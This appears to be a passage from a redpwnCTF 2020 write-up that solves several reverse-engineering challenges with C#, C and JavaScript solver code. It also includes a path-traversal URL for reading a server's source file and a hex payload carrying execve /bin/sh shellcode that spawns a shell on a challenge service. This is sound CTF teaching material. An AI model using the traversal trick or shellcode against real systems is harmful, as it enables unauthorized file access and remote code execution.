			  <p>To get the file we can just do <code>https://tux-fanpage.2020.redpwnc.tf/page?path=e&amp;path=/../../index.js</code>.</p>
			  <p>Note, it is very important that the first query value is one letter. This is because the trim code normally reads <code>dir[0]</code> which is the first character of a string. But in our case, it is the first value of an array. The regex <code>/^[a-z0-9]$/im</code> only matches if the string is one character because <code>^</code> means the beginning of the string and <code>$</code> means the end. If the string is already one letter, it is the equivalent to doing <code>dir[0]</code> yourself. If it's more than that, then you go down a rabbit hole of the strip command.</p>
			  <hr />
 			  <h3 id="SMarT-solver">rev/SMarT-solver</h3>
			  <h5>MrSlick</h5>
			  <blockquote>
			    <p>Find the correct flag. :)</p>
			    <p><strong>NOTE:</strong> All letters in the flag are lowercase</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/rev/smart-solver/SMarT-solver">SMarT-solver</a></p>
			  </blockquote>
			  <p>Some people used solvers for this problem, but once you realize that all 26 letters are used, then it's a lot easier. The premise of this problem is that you enter a function and need to have a bunch of conditions checked before you reach the win function. What happens is the value of every letter of your input is compared with every other letter.</p>
			  <p>Code is commented.</p>
			  <pre><code class="cs language-cs">class Program
{
    const ushort jbe = 0x860F; //First two bytes of jbe (jump if below or equal)
    const ushort jnb = 0x830F; //First two bytes of jnb (jump if not below aka if above or equal)

    static List&lt;int&gt; scores;
    static BinaryReader br;

    static void Main(string[] args)
    {
        scores = new List&lt;int&gt;();
        for (int i = 0; i &lt; 73; i++)
        {
            scores.Add(0);
        }

        br = new BinaryReader(File.OpenRead("SMarT-solver"));
        long goal, start;
        string input;

        Console.Write("goal pos (usually 0x11b93e): ");
        input = Console.ReadLine().Replace("0x", "");
        if (input != string.Empty)
            goal = long.Parse(input, NumberStyles.HexNumber) - 0x100000;
        else
            goal = 0x11b93e - 0x100000;

        Console.Write("start pos (usually 0x100926): ");
        input = Console.ReadLine().Replace("0x", "");
        if (input != string.Empty)
            start = long.Parse(input, NumberStyles.HexNumber) - 0x100000;
        else
            start = 0x100926 - 0x100000;

        //assembly:
        //
        //movzx   edx, [rbp+s]    ; OP CO DE    AD DR ES SS
        //movzx   eax, [rbp+s+1]  ; OP CO DE    AD DR ES SS
        //cmp     dl, al          ; OP    RG
        //jbe     loc_1B9C8       ; OP CO    AD DR ES SS

        br.BaseStream.Position = start;
        while (br.BaseStream.Position &lt; goal)
        {
            br.BaseStream.Position += 3; //movzx opcode
            int stkAIdx = GetStringIndexFromStackAddr(br.ReadInt32());
            br.BaseStream.Position += 3; //movzx opcode
            int stkBIdx = GetStringIndexFromStackAddr(br.ReadInt32());
            br.BaseStream.Position += 2; //cmp opcode and data
            ushort type = br.ReadUInt16(); //jmp opcode
            br.BaseStream.Position += 4; //jmp address
            if (type == jbe) //fail if a &lt;= b
            {
                scores[stkAIdx]++;
                Console.WriteLine("str[" + stkAIdx + "] &gt; str[" + stkBIdx + "]");
            }
            else if (type == jnb) //fail if a &gt;= b
            {
                scores[stkAIdx]--;
                Console.WriteLine("str[" + stkAIdx + "] &lt; str[" + stkBIdx + "]");
            }
            else
            {
                throw new Exception("ree");
            }
        }
        char[] cont = new char[73];
        char c = 'a'-1; //c will increase the first time to a
        Console.WriteLine("ranking:");
        for (int i = -72; i &lt; 73; i++)
        {
            bool first = true;
            for (int j = 0; j &lt; 73; j++)
            {
                if (scores[j] == i)
                {
                    if (first)
                    {
                        Console.WriteLine("============== " + i);
                        first = false;
                        c++;
                    }
                    cont[j] = c;
                    Console.WriteLine("str[" + j + "]");
                }
            }
        }
        Console.WriteLine(new string(cont));
        Console.ReadKey();
    }

    static int GetStringIndexFromStackAddr(int addr)
    {
        return 0x120 + addr;
    }
}</code></pre>
			  <p>Note, the last character is | instead of } since | is after { in terms of char codes for whatever reason.</p>
			  <hr />
 			  <h3 id="chezzzboard">rev/chezzzboard</h3>
			  <h5>dns</h5>
			  <blockquote>
			    <p>I'll also give you the flag if you beat me in chess</p>
			    <p><code>nc 2020.redpwnc.tf 31611</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/rev/chezzzboard/bin/chezzz">chezzz</a></p>
			  </blockquote>
			  <p>It's chess but special: kings can only move diagonally and pawns can only move once on their first move.</p>
			  <p>The goal of the game is to get a mysterious score value to equal exactly 467. The score value is calculated by different pieces on the board and their locations. Their values are calculated like so:</p>
			  <pre><code>king(i,j)=(8-i)+(j+9)
queen(i,j)=(8-i)*(j+9)
bishop(i,j)=((8-i)+(j+9)*2)
knight(i,j)=(j+9)%(8-i)
rook(i,j)=(256-(8-i))-(j+9)
pawn(i,j)=(8-i)-(j+9)</code></pre>
			  <p>Where i is the y axis and j is the x axis. Those can be converted like so:</p>
			  <pre><code>i=0 is y=8
i=1 is y=7
i=2 is y=6
i=3 is y=5
i=4 is y=4
i=5 is y=3
i=6 is y=2
i=7 is y=1

j=0 is x=A
j=1 is x=B
j=2 is x=C
j=3 is x=D
j=4 is x=E
j=5 is x=F
j=6 is x=G
j=7 is x=H</code></pre>
			  <p>I did the following:</p>
			  <p><code>467-king(2,6)-king(2,5)-rook(3,5)-queen(1,6)-queen(1,3)=0</code> which is </p>
			  <pre><code>king 6G
king 6F
rook 5F
queen 7G
queen 7D</code></pre>
			  <p>Which prints the flag. To get the pieces into those places fast, simply move the pawns out of the way, pull queens out and destroy each others' team, leaving one rook and both kings.</p>
			  <hr />
 			  <h3 id="wintendo-nii">rev/wintendo-nii</h3>
			  <h5>imyxh</h5>
			  <blockquote>
			    <p>Someone gave me this weird knockoff game console and I think it's hiding a flag. I managed to dump the firmware and host it on this server; can you take it from here?</p>
			    <p><code>nc 2020.redpwnc.tf 31215</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/rev/wintendo-nii/bin/nii">nii</a></p>
			  </blockquote>
			  <p>
			  <p>Solution:
			  <code>4E494976302E313A54776C7450726E63ABFC334DEB104831C05F4831F64831D24883C03B0F05E8EBFFFFFF2F62696E2F2F7368</code></p>
			  <p>We put in a hex string that contains headers, a checksum for the shellcode, and then some shellcode to get shell.</p>
			  <p>Explained:</p>
			  <pre><code>NIIv0.1: //required header
TwltPrnc //any of the values in the if statements
«ü3M     //checksum
ë.H1À_H1öH1ÒHƒÀ;..èëÿÿÿ/bin//sh //shellcode</code></pre>
              <p>(As for where the shellcode came from, I have no idea. Normally I would suggest <a href="http://shell-storm.org/shellcode/">shell-storm</a>.)</p>
			  <p>For the checksum, you can generate that by just running the code with the wrong checksum, peeking at the compare function, then replacing it with the correct checksum.</p>
			  <img src="https://user-images.githubusercontent.com/12544505/85961829-b1494200-b972-11ea-9a8b-b89a4cb6a1b5.png" />
			  <p>Decompiled code:</p>
			  <pre><code class="c language-c">long qword_0 = 0x03010102464c457f;

char buf[] = {
    0xe4, 0xba, 0x8c, 0xe3, 0x80, 0x87, 0xe4, 0xba,
    0x8c, 0xe3, 0x80, 0x87, 0xe5, 0xb9, 0xb4, 0xef,
    0xbc, 0x8c, 0xe7, 0xa8, 0xb3, 0xe5, 0xa4, 0xa9,
    0xe5, 0xa0, 0x82, 0xe8, 0xbd, 0xaf, 0xe4, 0xbb,
    0xb6, 0xe5, 0x85, 0xac, 0xe5, 0x8f, 0xb8, 0xe2,
    0x80, 0x94, 0xe2, 0x80, 0x94, 0xe7, 0x89, 0x88,
    0xe6, 0x9d, 0x83, 0xe6, 0x89, 0x80, 0xe6, 0x9c,
    0x89, 0xe3, 0x80, 0x82, 0x0a, 0xe8, 0xaf, 0xb7,
    0xe6, 0x8f, 0x92, 0xe5, 0x85, 0xa5, 0xe6, 0xb8,
    0xb8, 0xe6, 0x88, 0x8f, 0xe7, 0xa3, 0x81, 0xe7,
    0x9b, 0x98, 0xe2, 0x8b, 0xaf, 0xe2, 0x8b, 0xaf,
    0x0a, 0x00
}; //二〇二〇年，稳天堂软件公司——版权所有。
   //请插入游戏磁盘⋯⋯

short word_0 = 0;

char buf2[] = {
    0x48, 0x31, 0xc0, 0x90, 0x0f, 0x05, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    //I cut this out but there's quite a bit
    //btw, this is just "xor rax, rax; nop; syscall; nop; nop..."
}; //H1


void entry() {
    write(STDOUT_FILENO, &amp;buf, 89);
    qword_0 = sys_mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    *qword_0 = 0xc3;
    int length = read(STDIN_FILENO, &amp;buf2, 0x200);
    word_0 = length / 2;
    int i = 0;
    do {
        //this is cleaned to be easier to read but rax is never cleaned
        short word_1 = fun401010(buf2 + i * 2) &lt;&lt; 12;
        char byte_0 = fun401010(buf2 + i * 2 + 1) + ((word_1 &amp; 0xFF00) &gt;&gt; 8);
        buf2[buf2 + i] = byte_0;
        i++;
    } while(i &lt; word_0);
    if (((long*)buf2)[0] != 0x3a312e307649494e) //NIIv0.1:
        exit(1);

    if ((((long*)(buf2+8)) != 0x636e7250746c7754) &amp;&amp; //TwltPrnc
        (((long*)(buf2+8)) != 0x747261436f72614d) &amp;&amp; //MaroCart
        (((long*)(buf2+8)) != 0x2b2b73656e746946) &amp;&amp; //Fitnes++
        (((long*)(buf2+8)) != 0x676e69586c6e6d41)) { //AmnlXing
        exit(1);
    }

    //todo fix the trash
}</code></pre>
			  <hr />
 			  <h3 id="i-wanna-find-the-flag">rev/i-wanna-find-the-flag</h3>
			  <h5>MrSlick</h5>
			  <blockquote>
			    <p>Little Brother: Help! I can't beat this game.</p>
			    <p>It's too hard. You're a pro gamer, right?</p>
			    <p>You: SURE :)</p>
			  </blockquote>
			  <p>The hint at the beginning of the game is all you really need to figure this out. You'll notice that they have redpwn drawn in squares. So the flag is probably that way to. First, we need to decompile the game. I don't usually do gamemaker games so this was a first for me. To do this, we can use <a href="https://gitlab.com/PoroCYon/Altar.NET/-/jobs/artifacts/master/download?job=release">Altar</a>. First, pull out the data.win file by opening the exe in 7zip or using uniextract(2). Decompile the game using these flags:</p>
			  <pre><code class="bash language-bash">altar export --file data.win --project -d</code></pre>
			  <p>Note: if you want to use method 2, <em>make sure</em> not to use the --all flag. This will not print .asm files and break repackaging.</p>
			  <p>Once you do that, you should have all the files. You'll note that grepping for flag won't bring up anything important.</p>
			  <p>Here's a few methods from people:</p>
			  <h4>Method 1: undertale editor</h4>
			  <p><a href="https://github.com/krzys-h/UndertaleModTool">https://github.com/krzys-h/UndertaleModTool</a></p>
			  <p>Self explanatory. Just open the winner map.</p>
			  <h4>Method 2: winner drawing the hard way</h4>
			  <p>Remember how the start screen looked? Look at rWinner.json and notice the tile coordinates. We can easily parse these and print them.</p>
			  <p><a href="https://www.desmos.com/calculator/yqucn2r7en">desmos</a></p>
			  <p>Or some code</p>
			  <pre><code class="cs language-cs">private List&lt;Point&gt; points = new List&lt;Point&gt;();
public FindTheFlag()
{
    InitializeComponent();
}

private void ShowFlagClick(object sender, EventArgs e)
{
    OpenFileDialog ofd = new OpenFileDialog();
    if (ofd.ShowDialog() == DialogResult.OK)
    {
        LoadStuff(ofd.FileName);
    }
}

private void LoadStuff(string fileName)
{
    dynamic root = JObject.Parse(File.ReadAllText(fileName));
    foreach (dynamic tile in root.tiles)
    {
        points.Add(new Point((int)tile.pos.x, (int)tile.pos.y));
    }
    Refresh();
}

protected override void OnPaint(PaintEventArgs e)
{
    base.OnPaint(e);

    foreach (Point p in points)
    {
        e.Graphics.FillRectangle(Brushes.Black, p.X / 2, p.Y / 2, 16, 16);
    }
}</code></pre>
			  <p>ez</p>
			  <h4>Method 3: the hard way (but now you can play miku cherry)</h4>
			  <p>There's actually a hidden debug mode and you can enable that by looking at the <code>gml_Object_objWorld_Step_0.gml.asm</code> file at <code>0x00056C</code>.</p>
			  <p>(btw you could probably do this in undertale editor too but eh watever didn't know about it at the time)</p>
			  <pre><code>0x000564: not bool:double
0x000568: br 0x000570
0x00056C: push.cst int16 0  ; &lt;--- set to 1 to enable debug mode
0x000570: brf 0x00078C
0x000574: push.i16 int16 9</code></pre>
			  <p>Once that's set, the game has to be repackaged. There's probably a better way for this but I don't know of it so I just used tools I do know. First, use ResourceHacker and pull out the CABINET file inside the exe. Extract the cabinet file as usual with 7z or whatever. Back in your project folder, run </p>
			  <pre><code>altar import --file YoYoYo_Engine.json --out data.win-modified</code></pre>
			  <p>Replace the data.win file in the extracted CABINET folder with data.win-modified (rename it back to data.win ofc). Now use <a href="https://github.com/sapientcoder/CabMaker/">CabMaker</a> to package your folder back into a cab file. Then use ResourceHacker to import the cab file back in (you need to rename the extension to <code>.raw</code>.) Then start the game.</p>
			  <pre><code>Controls:
Page Up/Page Down: Switch stages
Insert: Funny sound
Delete: Show hitbox
Home: Invincibility
End: Infinite jump
Tab: Teleport to cursor (good for miku game!!!!!)</code></pre>
			  <hr />
 			  <h3 id="fetusmaze">rev/fetusmaze</h3>
			  <h5>dns</h5>
			  <blockquote>
			    <p>You can run this one without installing freeglut! Thanks to xusheng for help and inspiration.</p>
			    <p><code>nc 2020.redpwnc.tf 31031</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/rev/fetusmaze/bin/maze">maze</a></p>
			  </blockquote>
			  <p>Unimportant but your boi got first solve:</p>
			  <img src="https://user-images.githubusercontent.com/12544505/85961880-1d2baa80-b973-11ea-996c-e4ea2fc8ff0c.png" />
			  <p>A maze in assembly. Each direction you go changes the address in the program. You have to get to <code>mov eax, 1</code> (return true).</p>
			  <p>To find the return true code, simply export the asm and grep for <code>mov eax, 1</code>. Some people used rop tools which I suppose you could do as well.</p>
			  <p>For some reason I started at the end and went backwards but it doesn't really matter. My solution was to go to the end, find all possible locations that could jump to that address, and go there and repeat the process. If the instruction wasn't `lea rax, ...` then it gave up in that area.</p>
			  <pre><code class="cs language-cs">const ushort leaRax = 0x8D48; //aka valid path
const int exitLen = 0x57; //distance from jump location back to start of block
static BinaryReader br;
static HashSet&lt;long&gt; visitedAddrs;

static void Main(string[] args)
{
    br = new BinaryReader(File.OpenRead("maze"));
    visitedAddrs = new HashSet&lt;long&gt;();
    Console.Write("goal pos (usually 0x8B40): ");
    long goal = long.Parse(Console.ReadLine().Replace("0x", ""), NumberStyles.HexNumber);
    //calculating "what places could possibly jump to this address..."
    long branch1 = CalcJump(goal, 1); if (ValidBackpath(branch1)) RecurseToStart(branch1, "1");
    long branch2 = CalcJump(goal, 2); if (ValidBackpath(branch2)) RecurseToStart(branch2, "2");
    long branch3 = CalcJump(goal, 3); if (ValidBackpath(branch3)) RecurseToStart(branch3, "3");
    long branch4 = CalcJump(goal, 4); if (ValidBackpath(branch4)) RecurseToStart(branch4, "4");
}
static void RecurseToStart(long pos, string path)
{
    if (0x1D330 &lt;= pos &amp;&amp; pos &lt; 0x1D39A)
    {
        Console.WriteLine("done, path found was " + path);
        Console.ReadKey();
        Environment.Exit(0);
    }
    visitedAddrs.Add(pos);
    //head back to the start of the "function"
    pos -= exitLen;
    long branch1 = CalcJump(pos, 1); if (!visitedAddrs.Contains(branch1) &amp;&amp; ValidBackpath(branch1)) RecurseToStart(branch1, "1" + path);
    long branch2 = CalcJump(pos, 2); if (!visitedAddrs.Contains(branch2) &amp;&amp; ValidBackpath(branch2)) RecurseToStart(branch2, "2" + path);
    long branch3 = CalcJump(pos, 3); if (!visitedAddrs.Contains(branch3) &amp;&amp; ValidBackpath(branch3)) RecurseToStart(branch3, "3" + path);
    long branch4 = CalcJump(pos, 4); if (!visitedAddrs.Contains(branch4) &amp;&amp; ValidBackpath(branch4)) RecurseToStart(branch4, "4" + path);
}
static bool ValidBackpath(long pos)
{
    br.BaseStream.Position = pos;
    return br.ReadUInt16() == leaRax;
}
static long CalcJump(long pos, int dir)
{
    int dirVal;
    switch (dir)
    {
        case 1: dirVal = -1 * 0x33; break; //up
        case 2: dirVal = -1 * 1; break; //left
        case 3: dirVal = 1 * 1; break; //right
        case 4: dirVal = 1 * 0x33; break; //down
        default: throw new Exception("are you actually dumb");
    }
    return pos - 106 * dirVal + 87;
}</code></pre>
			  <p>Here's the full map in case you want to see it:</p>
			  <pre><code>███████████████████████████████████████████████████
█     █               █     █       █   █       █ █
█ █ █ █████ █████████ ███ █ █ █████ █ █ █ ███ █ █ █
█ █ █ █   █ █       █   █ █   █ █   █ █ █ █   █ █ █
█ █ █ █ █ █ █ █████ ███ █ █████ █ ███ █ █ █ ███ █ █
█ █ █   █ █ █   █ █     █ █     █   █ █   █ █   █ █
███ █████ █ ███ █ ███████ █ █ █ ███ █ █████ ███ █ █
█ █ █     █   █ █ █   █   █ █ █   █   █   █   █   █
█ █ █ ███████ █ █ █ █ █ █████ █████████ █ ███ ███ █
█   █   █     █ █ █ █   █     █     █   █   █   █ █
███████ █ █████ █ █ ███████ █ █ ███ █ █████ ███ ███
█     █   █ █   █ █     █   █ █ █   █     █   █   █
█████ █████ █ ███ █████ █ █████ █ ███ ███ ███ ███ █
█     █     █ █     █     █     █ █     █ █ █     █
█ █████ █ ███ █ ███ █ █████ █████ ███████ █ █████ █
█   █   █     █   █   █     █     █       █     █ █
███ █ █████████████ ███ █████ █████ ███████ █████ █
█   █ █           █  S█     █ █       █ █         █
█ █ █ █ █ ███████ █████████ █ █ █████ █ █ █████████
█ █ █ █ █ █   █ █       █   █ █     █ █ █ █       █
█ █ █ ███ █ █ █ ███████ █ ███ █████ █ █ █ █ ███ █ █
█ █ █   █ █ █ █ █   █   █ █ █   █   █ █   █   █ █ █
█ █████ █ █ █ █ █ █ █ ███ █ ███ █████ █ ███████ █ █
█   █   █   █ █   █   █   █   █       █         █ █
█ █ █ ███████ ███ █████ ███ ███████ █████████████ █
█ █ █ █     █   █ █       █       █ █     █     █ █
█ █ █ █ ███ ███ █ █████ █ █ █ █████ █ ███ █ ███ █ █
█ █   █   █ █   █ █   █ █ █ █ █     █ █ █   █ █ █ █
█ ███████ █ █ ███ █ █ █ █ █ █ █ █████ █ █████ █ ███
█   █   █ █ █ █ █ █ █ █ █ █ █   █   █   █   █ █   █
███ █ █ █ █ █ █ █ █ █ ███ █ █████ █ ███ █ █ █ ███ █
█   █ █   █   █ █ █ █   █ █ █     █     █ █     █ █
█ ███ █████████ █ █ ███ █ ███ ███████████ ███████ █
█ █   █         █   █   █   █     █       █     █ █
█ █ ███ █████ █ █████ █████ █████ ███ █████ ███ █ █
█   █ █ █   █ █ █     █         █     █   █ █     █
█████ █ █ █ █ ███ █████ █ █████ ███ ███ █ █ █████ █
█     █ █ █ █   █ █     █ █     █   █   █ █ █   █ █
█████ █ █ █ ███ █ ███████ ███████ ███ ███ █ █ █ ███
█     █ █ █ █   █ █     █         █   █   █   █   █
█ █████ █ █ █ ███ █ ███ █████████ █ ███ ███ █████ █
█ █  E  █ █ █ █   █ █   █       █ █ █   █     █   █
█ █ ███████ █ █ ███ ███ █ █████ ███ █ ███████ █ █ █
█   █       █   █     █ █ █   █     █ █     █ █ █ █
█ ███ █████ █████ ███ █ █ █ █ ███████ █ ███ ███ █ █
█ █     █       █   █ █ █   █ █   █   █ █ █     █ █
█ █████ ███████ █████ █ █ ███ █ █ █ ███ █ ███████ █
█     █       █   █   █ █ █   █ █   █   █ █   █   █
█████ ███████ ███ █ ███ ███ ███ ███████ █ █ █ █ ███
█             █     █       █           █   █     █
███████████████████████████████████████████████████</code></pre>
			  <hr />
 			  <h3 id="a-round-mechanism">rev/a-round-mechanism</h3>
			  <h5>green beans</h5>
			  <blockquote>
			    <p>I found a respectable mainframe, can you help me get in? Flag is in flag.txt</p>
			    <p><code>nc 2020.redpwnc.tf 31359</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/tree/master/rev/a-round-mechanism">a-round-mechanism</a></p>
			  </blockquote>
			  <p>Arm fun instead of x86/_64. IDA free doesn't support ARM debugging, Cutter sucks at debugging, and gdb is kind of annoying. So we'll use radare2 (the stuff that runs Cutter). It has a cui for debugging stuff. Also, we'll need multiarch qemu to debug the arm app.</p>
			  <p>To start the program: <code>qemu-arm -singlestep -g 1230</code></p>
			  <p>To connect r2 to the program: <code>r2 -a arm -d gdb://localhost:1230</code></p>
			  <p>Once connected, type <code>V!</code> to open the debugging mode. Press w to go into windowed mode so you can resize windows. Arrow keys selects a window and shift+arrow resizes it from the edge of your arrow key. Once you've resized the main assembly window, press <code>q</code> to go back and use the right arrow to fill the assembly screen.</p>
			  <img src="https://user-images.githubusercontent.com/12544505/85961874-f8cfce00-b972-11ea-8a0c-423b82cb71aa.png" />
			  <p>Debugging keys:</p>
			  <pre><code>  F2      toggle breakpoint
  F4      run to cursor
  F7      single step
  F8      step over
  F9      continue</code></pre>
			  <p>The final answer (or one of them): <code>&amp;%!_qrvuNd_ws_gD_wu`DN</code></p>
			  <p>Our goal as you may find out is to get our string to equal <code>te@B}efFk~{^Ixv@}y\BC4</code>. However, we have a few problems. Our input is xor'd with 0x12, then some weird magic is done on it. Not only that, but the final result is tested backwards. So you actually need to test for <code>4CB\y}@vxI^{~kFfe}b@et</code>.</p>
			  <p>So here's what we have:</p>
			  <pre><code class="js language-js">//original function (basically) at 0x860ec
//a for loop is run from the 2nd to last characters,
//xoring the previous character with the current and
//replacing the current character
//bc = before character
//tc = this/current character
function decodeMagic(bc, tc) {
    var step1 = (bc &gt;&gt; 1) + (tc &lt;&lt; 1);
    var step2 = (step1 &gt;&gt; (step1 &gt;&gt; 7)) - 1;
    return step2;
}

//given a character before, what possibilities
//are there resulting in a target character
//bc = before character
//tc = target character
function decodeFor(bc, tar) {
    var pos = [];
    for (var i = 0; i &lt; 0xff; i++) {
        if (decodeMagic(bc, i) == tar) {
            pos.push(i);
        }
    }
    return pos;
}</code></pre>
			  <p>Somewhat similar to the type of stuff in pseudo key.</p>
			  <p>It was very late when I did this but I think I manually tested for values using decodeFor then xor'd the string with 0x12 at the end.</p>
			  <p>[TODO - Actual code]</p>
			</div>
		</div>
	</body>
</html>